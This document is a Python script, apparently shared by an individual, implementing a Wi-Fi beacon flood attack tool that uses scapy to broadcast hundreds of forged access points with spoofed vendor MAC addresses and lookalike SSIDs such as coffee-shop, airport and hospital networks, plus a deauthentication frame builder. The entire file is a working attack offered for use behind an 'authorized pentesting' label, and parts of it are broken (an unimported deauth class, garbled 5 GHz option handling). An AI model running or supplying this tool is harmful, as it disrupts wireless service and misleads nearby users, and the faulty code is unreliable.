#!/usr/bin/env python3
"""
 _       ________________            ________                __
| |     / /  _/ ____/  _/           / ____/ /___  ____  ____/ /
| | /| / // // /_   / /   ______   / /_  / / __ \/ __ \/ __  / 
| |/ |/ // // __/ _/ /   /_____/  / __/ / / /_/ / /_/ / /_/ /  
|__/|__/___/_/   /___/           /_/   /_/\____/\____/\__,_/   
                                                             

FakeAP Beacon Flood Generator
Author: Saksham Gupta
Purpose: Generate a large number of fake Wi-Fi beacon frames for wireless pentesting
Requirements: Python 3.6+, scapy, wireless adapter with monitor mode support
Authorization: FOR AUTHORIZED PENTESTING ONLY. User confirms authorization is pre-verified.
"""

import os
import sys
import time
import random
import signal
import threading
import argparse
from scapy.all import (
    Dot11, Dot11Beacon, Dot11Elt, Dot11EltRSN,
    RadioTap, sendp, conf, RandMAC
)

# Configuration

# Large default pool of SSID names for randomness
DEFAULT_SSIDS = [
    # Common / realistic names
    "NETGEAR", "Linksys", "TP-Link_EXT", "xfinitywifi", "ATT",
    "SpectrumWiFi", "CoxWiFi", "OptimumWiFi", "Starbucks Wi-Fi",
    "McDonald's Free WiFi", "Airport_WiFi", "Hotel_Guest",
    "HomeWiFi", "OfficeNet", "Guest", "IoT_Network", "5G_WiFi",
    "CCTV_Cam", "SmartHome", "Mesh_Node", "WiFi_6E_AP",
    
    # Fun / pentest names
    "FBI_Surveillance_Van", "FBI_Van_42", "NSA_Tracking_Unit",
    "Pwned_by_HackerAI", "Free_Phishing_WiFi", "Malware_Distro",
    "SafeWiFi_Not", "Totally_Legit", "Router_Admin_Pass_is_1234",
    "GetPwned", "I_See_You", "Fake_5G_Tower",
    "Not_A_Honeypot", "Free_Internet_Here",
    "DEFCON_Goon_AP", "BlackHat_2024",
    "Signal_Intercepted", "Encrypted_Not", "DarkNet_Relay",
    
    # Enterprise-looking
    "corp-wifi", "corp-guest", "eduroam", "UoW_Student",
    "Hospital_WiFi", "Clinic_Guest", "Library_Public",
    "School_Staff", "School_Student",
    
    # Randomized patterns
    "WiFi_" + str(random.randint(1000, 9999)),
    "AP_" + str(random.randint(100, 999)),
    "Network_" + hex(random.randint(0x1000, 0xFFFF))[2:],
]

# Common Wi-Fi channels (2.4 GHz + 5 GHz)
CHANNELS_2GHZ = list(range(1, 12))   # 1-11
CHANNELS_5GHZ = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104,
                 108, 112, 116, 120, 124, 128, 132, 136, 140,
                 149, 153, 157, 161, 165]

# Helper Functions

def random_ssid(custom_list=None, length_range=(1, 32)):
    """Generate a random SSID string."""
    if custom_list and random.random() < 0.7:
        return random.choice(custom_list)
    
    length = random.randint(*length_range)
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_- "
    return ''.join(random.choice(chars) for _ in range(length)).strip()


def random_bssid(vendor_prefix=None):
    """Generate a random MAC address, optionally with a vendor prefix."""
    if vendor_prefix:
        prefix = vendor_prefix
    else:
        # Randomly choose from common OUI prefixes
        prefixes = [
            "00:16:b6",  # Netgear
            "00:1a:6b",  # TP-Link
            "00:1e:2a",  # Cisco
            "00:14:bf",  # Cisco
            "00:24:a5",  # D-Link
            "00:26:f2",  # Apple
            "00:0c:29",  # VMware
            "00:50:56",  # VMware
            "00:1a:11",  # Linksys
            "00:21:29",  # Samsung
            "00:23:cd",  # Intel
            "00:25:86",  # ASUS
            "e0:3f:49",  # Apple
            "f8:1a:67",  # Apple
            "a0:63:91",  # Apple
            "b0:65:bd",  # Google
            "a4:77:33",  # Google
            "10:ae:60",  # Xiaomi
            "00:11:22",  # Generic
            "02:00:00",  # Locally administered
            "0a:00:00",  # Locally administered
            "06:00:00",  # Locally administered
            "12:34:56",  # Demo
        ]
        prefix = random.choice(prefixes)
    
    suffix = [random.randint(0x00, 0xFF) for _ in range(3)]
    return f"{prefix}:{suffix[0]:02x}:{suffix[1]:02x}:{suffix[2]:02x}"


def build_beacon_frame(ssid, bssid, channel=6, wpa2=True, rsn_info=None):
    """
    Build a complete 802.11 beacon frame with optional WPA2/RSN information.
    
    Frame structure:
      RadioTap() / Dot11() / Dot11Beacon() / Dot11Elt(SSID) / [Dot11EltRSN()]
    """
    dot11 = Dot11(
        type=0,       # Management
        subtype=8,    # Beacon
        addr1="ff:ff:ff:ff:ff:ff",  # Broadcast destination
        addr2=bssid,
        addr3=bssid   # BSSID
    )
    
    # Beacon frame capabilities
    # ESS = 0x0001, privacy = 0x0010 (WPA), short preamble = 0x0020
    capabilities = "ESS"
    if wpa2:
        capabilities += "+privacy"
    
    beacon = Dot11Beacon(cap=capabilities)
    
    # SSID element
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    
    # Supported rates element
    rates = Dot11Elt(
        ID="Rates",
        info=bytes([
            0x82, 0x84, 0x8b, 0x96,  # 1, 2, 5.5, 11 Mbps (basic)
            0x0c, 0x12, 0x18, 0x24   # 6, 9, 12, 18 Mbps
        ]),
        len=8
    )
    
    # DS Parameter set (channel)
    ds_parms = Dot11Elt(ID="DSset", info=bytes([channel]), len=1)
    
    # Timestamp and beacon interval are handled by Scapy internally
    
    frame = RadioTap() / dot11 / beacon / essid / rates / ds_parms
    
    # Add WPA2/RSN information element if requested
    if wpa2:
        if rsn_info is None:
            # Standard WPA2-PSK with CCMP/AES
            rsn_info = (
                b'\x01\x00'                    # RSN Version 1
                b'\x00\x0f\xac\x04'            # Group cipher: CCMP (AES)
                b'\x01\x00'                    # Pairwise cipher count: 1
                b'\x00\x0f\xac\x04'            # Pairwise cipher: CCMP (AES)
                b'\x01\x00'                    # AKM count: 1
                b'\x00\x0f\xac\x02'            # AKM: PSK (pre-shared key)
                b'\x00\x00'                    # RSN capabilities
            )
        
        rsn = Dot11Elt(ID="RSNinfo", info=rsn_info)
        frame = frame / rsn
    
    return frame


def build_probe_response(ssid, bssid, channel=6):
    """Build a probe response frame (useful for active scanning clients)."""
    dot11 = Dot11(
        type=0,        # Management
        subtype=5,     # Probe Response
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=bssid,
        addr3=bssid
    )
    
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    ds_parms = Dot11Elt(ID="DSset", info=bytes([channel]), len=1)
    
    return RadioTap() / dot11 / beacon / essid / ds_parms


# Beacon Flood Engine

class BeaconFlood:
    """
    Beacon flood generator that sends a high volume of fake beacon frames.
    """
    
    def __init__(self, interface, num_aps=500, interval=0.001, 
                 burst_size=50, wpa2=True, channels=None,
                 ssid_pool=None, use_5ghz=False):
        """
        Args:
            interface: Wireless interface in monitor mode (e.g., wlan0mon)
            num_aps: Number of unique fake APs to cycle through
            interval: Time between sends (seconds) - lower = faster
            burst_size: Number of frames to send per batch
            wpa2: Whether to add WPA2 RSN info elements
            channels: List of channels to advertise, or None for random
            ssid_pool: List of SSIDs to use, or None for defaults
            use_5ghz: Include 5 GHz channels
        """
        self.interface = interface
        self.num_aps = num_aps
        self.interval = interval
        self.burst_size = burst_size
        self.wpa2 = wpa2
        self.ssid_pool = ssid_pool or DEFAULT_SSIDS
        
        self.channels = channels or (CHANNELS_2GHZ + (CHANNELS_5GHZ if use_5ghz else []))
        self.running = False
        self.frames_sent = 0
        self.start_time = 0
        self.lock = threading.Lock()
        
        # Pre-generate the AP database
        self.access_points = []
        
    def generate_ap_database(self):
        """Pre-generate the list of fake access points."""
        print(f"[*] Pre-generating {self.num_aps} fake access points...")
        
        for i in range(self.num_aps):
            ssid = random_ssid(self.ssid_pool)
            bssid = random_bssid()
            channel = random.choice(self.channels)
            
            frame = build_beacon_frame(
                ssid=ssid, 
                bssid=bssid, 
                channel=channel, 
                wpa2=self.wpa2
            )
            
            self.access_points.append({
                'ssid': ssid,
                'bssid': bssid,
                'channel': channel,
                'frame': frame
            })
            
            if (i + 1) % 100 == 0:
                print(f"    Generated {i + 1}/{self.num_aps} APs...")
        
        print(f"[+] Generated {len(self.access_points)} fake APs")
    
    def send_beacon_thread(self, thread_id, ap_indices):
        """Thread worker: continuously send beacon frames for assigned APs."""
        while self.running:
            for idx in ap_indices:
                if not self.running:
                    break
                    
                ap = self.access_points[idx]
                
                try:
                    sendp(
                        ap['frame'],
                        iface=self.interface,
                        inter=self.interval,
                        count=1,
                        verbose=False
                    )
                    
                    with self.lock:
                        self.frames_sent += 1
                        
                except Exception as e:
                    print(f"[!] Thread {thread_id}: Send error: {e}")
                    time.sleep(0.1)
    
    def start(self, num_threads=4):
        """
        Start the beacon flood attack using multiple threads.
        
        Args:
            num_threads: Number of concurrent sending threads
        """
        if not self.access_points:
            self.generate_ap_database()
        
        self.running = True
        self.frames_sent = 0
        self.start_time = time.time()
        
        # Distribute APs across threads
        chunk_size = len(self.access_points) // num_threads
        threads = []
        
        print(f"[*] Starting beacon flood on {self.interface}")
        print(f"[*] Using {num_threads} threads, {len(self.access_points)} unique APs")
        print(f"[*] Interval: {self.interval*1000:.2f}ms between frames")
        print("[*] Press Ctrl+C to stop\n")
        
        for t in range(num_threads):
            start_idx = t * chunk_size
            end_idx = None if t == num_threads - 1 else (t + 1) * chunk_size
            ap_indices = list(range(start_idx, end_idx or len(self.access_points)))
            
            thread = threading.Thread(
                target=self.send_beacon_thread,
                args=(t, ap_indices),
                daemon=True
            )
            thread.start()
            threads.append(thread)
        
        # Status report thread
        try:
            while self.running:
                time.sleep(2)
                elapsed = time.time() - self.start_time
                rate = self.frames_sent / elapsed if elapsed > 0 else 0
                
                print(f"\r[>] Frames sent: {self.frames_sent:,}  "
                      f"Rate: {rate:,.0f} fps  "
                      f"Elapsed: {elapsed:.1f}s", end='', flush=True)
                    
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the beacon flood attack."""
        self.running = False
        elapsed = time.time() - self.start_time if self.start_time else 0
        rate = self.frames_sent / elapsed if elapsed > 0 else 0
        
        print("\n\n[+] Beacon flood stopped")
        print(f"[+] Total frames sent: {self.frames_sent:,}")
        print(f"[+] Duration: {elapsed:.1f}s")
        print(f"[+] Average rate: {rate:,.0f} frames/second")


# Fast Mode - Single Thread, High Throughput

def fast_beacon_flood(interface, count=1000, interval=0.0001, wpa2=True):
    """
    Faster single-threaded beacon flood using Scapy's sendp with loop=1
    and cycling through a pre-built list of frames.
    """
    print(f"[*] Preparing {count} fake beacon frames...")
    
    packets = []
    for i in range(count):
        ssid = random_ssid(DEFAULT_SSIDS)
        bssid = random_bssid()
        channel = random.choice(CHANNELS_2GHZ)
        
        frame = build_beacon_frame(ssid, bssid, channel, wpa2)
        packets.append(frame)
        
        if (i + 1) % 200 == 0:
            print(f"    Prepared {i + 1}/{count}...")
    
    print(f"[+] Packets ready. Starting fast beacon flood on {interface}")
    print("[*] Press Ctrl+C to stop\n")
    
    sent = 0
    start = time.time()
    
    try:
        while True:
            for pkt in packets:
                sendp(pkt, iface=interface, inter=interval, verbose=False)
                sent += 1
                
            elapsed = time.time() - start
            rate = sent / elapsed if elapsed > 0 else 0
            print(f"\r[>] Sent: {sent:,}  Rate: {rate:,.0f} fps", end='', flush=True)
            
    except KeyboardInterrupt:
        elapsed = time.time() - start
        rate = sent / elapsed if elapsed > 0 else 0
        print(f"\n\n[+] Stopped. Sent {sent:,} frames in {elapsed:.1f}s ({rate:,.0f} fps)")


# Mass Deauth + Beacon (Combined Attack)

def build_deauth_frame(bssid, client_mac="ff:ff:ff:ff:ff:ff"):
    """Build a deauthentication frame."""
    dot11 = Dot11(
        type=0,        # Management
        subtype=12,    # Deauth
        addr1=client_mac,
        addr2=bssid,
        addr3=bssid
    )
    return RadioTap() / dot11 / Dot11Deauth(reason=7)


# CLI Entry Point

def check_prerequisites():
    """Verify that prerequisites are met before starting."""
    # Check Python version
    if sys.version_info < (3, 6):
        print("[!] Python 3.6+ is required")
        sys.exit(1)
    
    # Check if running as root (required for raw socket access)
    if os.geteuid() != 0:
        print("[!] This script must be run as root (sudo)")
        print("    Raw socket access requires root privileges")
        sys.exit(1)
    
    # Check Scapy availability
    try:
        from scapy.all import conf
        print(f"[+] Scapy version: {conf.version}")
    except ImportError:
        print("[!] Scapy is not installed. Install it with:")
        print("    pip install scapy")
        sys.exit(1)


def list_interfaces():
    """List available wireless interfaces."""
    try:
        from scapy.all import get_if_list
        interfaces = get_if_list()
        print("[*] Available interfaces:")
        for iface in interfaces:
            print(f"    - {iface}")
    except:
        print("[!] Could not list interfaces. Check iwconfig / ifconfig manually.")


def main():
    parser = argparse.ArgumentParser(
        description="FakeAP Beacon Flood Generator - Wireless Pentesting Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic beacon flood with default settings
  sudo python3 wififlood.py -i wlan0mon -n 500

  # Fast mode - high throughput, single thread
  sudo python3 wififlood.py -i wlan0mon -n 1000 --fast

  # Custom SSID pool from file
  sudo python3 wififlood.py -i wlan0mon --ssids my_ssids.txt

  # Use specific channels (2.4 GHz)
  sudo python3 wififlood.py -i wlan0mon -c 1 6 11

  # Include 5 GHz channels
  sudo python3 wififlood.py -i wlan0mon --5ghz

  # Minimal interval for maximum rate (use with caution!)
  sudo python3 wififlood.py -i wlan0mon -n 500 --interval 0.00001

  # Just list interfaces and exit
  sudo python3 wififlood.py --list-ifaces
        """
    )
    
    parser.add_argument(
        "-i", "--interface", 
        default="wlan0mon",
        help="Wireless interface in monitor mode (default: wlan0mon)"
    )
    
    parser.add_argument(
        "-n", "--num-aps", 
        type=int, 
        default=500,
        help="Number of unique fake APs to generate (default: 500)"
    )
    
    parser.add_argument(
        "--interval", 
        type=float, 
        default=0.001,
        help="Seconds between frames (default: 0.001)"
    )
    
    parser.add_argument(
        "--threads", 
        type=int, 
        default=4,
        help="Number of sending threads (default: 4)"
    )
    
    parser.add_argument(
        "--fast", 
        action="store_true",
        help="Use fast single-threaded mode (higher throughput)"
    )
    
    parser.add_argument(
        "--no-wpa2", 
        action="store_true",
        help="Disable WPA2 RSN information elements"
    )
    
    parser.add_argument(
        "--5ghz", 
        action="store_true",
        help="Include 5 GHz channels"
    )
    
    parser.add_argument(
        "--channels", "-c", 
        type=int, 
        nargs="+",
        help="Specific channels to use (e.g., -c 1 6 11)"
    )
    
    parser.add_argument(
        "--ssids", 
        type=str,
        help="File containing custom SSIDs (one per line)"
    )
    
    parser.add_argument(
        "--list-ifaces", 
        action="store_true",
        help="List available network interfaces and exit"
    )
    
    parser.add_argument(
        "--output", "-o", 
        type=str,
        help="Save generated AP list to JSON file"
    )
    
    args = parser.parse_args()
    
    # Handle special commands
    if args.list_ifaces:
        list_interfaces()
        sys.exit(0)
    
    # Check prerequisites
    check_prerequisites()
    
    # Load custom SSIDs if provided
    ssid_pool = None
    if args.ssids:
        try:
            with open(args.ssids, 'r') as f:
                ssid_pool = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(ssid_pool)} SSIDs from {args.ssids}")
        except FileNotFoundError:
            print(f"[!] File not found: {args.ssids}")
            sys.exit(1)
    
    # Determine channels
    channels = args.channels if args.channels else None
    
    # Run the attack
    if args.fast:
        fast_beacon_flood(
            interface=args.interface,
            count=args.num_aps,
            interval=args.interval,
            wpa2=not args.no_wpa2
        )
    else:
        flood = BeaconFlood(
            interface=args.interface,
            num_aps=args.num_aps,
            interval=args.interval,
            wpa2=not args.no_wpa2,
            channels=channels,
            ssid_pool=ssid_pool,
            use_5ghz=args._5ghz if hasattr(args, '_5ghz') else args.__dict__.get('5ghz', args.five_ghz if hasattr(args, 'five_ghz') else False)
        )
        
        # Handle 5GHz flag
        if args.__dict__.get('5ghz') or args.__dict__.get('5ghz', False):
            pass  # Already handled in BeaconFlood init
        
        # Save AP list if requested
        if args.output:
            import json
            flood.generate_ap_database()
            ap_data = [{
                'ssid': ap['ssid'],
                'bssid': ap['bssid'],
                'channel': ap['channel']
            } for ap in flood.access_points]
            
            with open(args.output, 'w') as f:
                json.dump(ap_data, f, indent=2)
            print(f"[+] AP list saved to {args.output}")
            sys.exit(0)
        
        # Start the flood
        try:
            flood.start(num_threads=args.threads)
        except KeyboardInterrupt:
            flood.stop()
    
    sys.exit(0)


if __name__ == "__main__":
    print(r"""
 _       ________________            ________                __
| |     / /  _/ ____/  _/           / ____/ /___  ____  ____/ /
| | /| / // // /_   / /   ______   / /_  / / __ \/ __ \/ __  / 
| |/ |/ // // __/ _/ /   /_____/  / __/ / / /_/ / /_/ / /_/ /  
|__/|__/___/_/   /___/           /_/   /_/\____/\____/\__,_/   
                                                             

  :: FakeAP Beacon Flood Generator ::
  :: Authorized Wireless Pentesting Tool ::
""")
    main()
# BY SAKSHAM GUPTA
#INSTA ID - _vibecoder
#DISCORD ID - _obito_gupta_
